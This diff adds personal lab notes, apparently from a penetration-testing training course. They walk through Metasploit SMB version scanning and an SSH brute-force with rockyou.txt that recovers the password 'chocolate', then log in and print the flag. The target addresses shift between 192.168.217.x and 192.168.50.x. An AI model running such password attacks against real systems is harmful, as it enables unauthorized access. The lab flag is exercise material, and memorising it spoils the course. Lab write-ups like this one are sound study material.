@@ -14,5 +14,50 @@ msf6> search type:auxiliary smb
 
 # Lets say we want to use no 64
 msf6> use 64
+msf6 auxiliary(scanner/smb/smb_version) > show options
+...
+ RHOSTS           yes       The target host(s)...
+THREADS  1      yes       The number of concurrent threads (max one per 
+...
+msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.217.202
+msf6 auxiliary(scanner/smb/smb_version) > services -p 445 --rhosts
+msf6 auxiliary(scanner/smb/smb_version) > run
+msf6 auxiliary(scanner/smb/smb_version) > vulns
+...
+2022-07-28 10:17:41 UTC  192.168.50.202  SMB Signing Is Not Required  URL-https://support.microsoft.com/en-us/help/161372/how-to-enable-smb-signing-in-windows-nt,URL-https://support.microsoft.com/en-us/help/88
+                                                                      7429/overview-of-server-message-block-signing
+...
 
+# Lets try on another module in the Password Attacks module
+msf6 auxiliary(scanner/smb/smb_version) > search type:auxiliary ssh
+...
+   16  auxiliary/scanner/ssh/ssh_login normal  No     SSH Login Check Scanner
+...
+msf6 auxiliary(scanner/smb/smb_version) > use 16
+msf6 auxiliary(scanner/ssh/ssh_login) > show options
+...
+PASSWORD   
+RHOSTS
+RPORT
+USERNAME
+USER_FILE
+...
 
+# As in the example in Password Attacks, we assume we already identified the username george. We can specify rockyou.txt for the option PASS_FILE. Finally, we set RHOSTS to 192.168.217.201 and RPORT to 2222.
+msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
+msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME george
+msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.50.201
+msf6 auxiliary(scanner/ssh/ssh_login) > set RPORT 2222
+
+# Start exploit
+msf6 auxiliary(scanner/ssh/ssh_login) > run
+...
+Success: 'george:chocolate' 'uid=1001(george) 
+...
+
+# Now obtained the password lets capture the flag
+ssh george@192.168.217.201 -p2222
+password: chocolate
+
+cat flag.txt
+OS{79c5f06bc52fd314150ce3ef47ed613a}
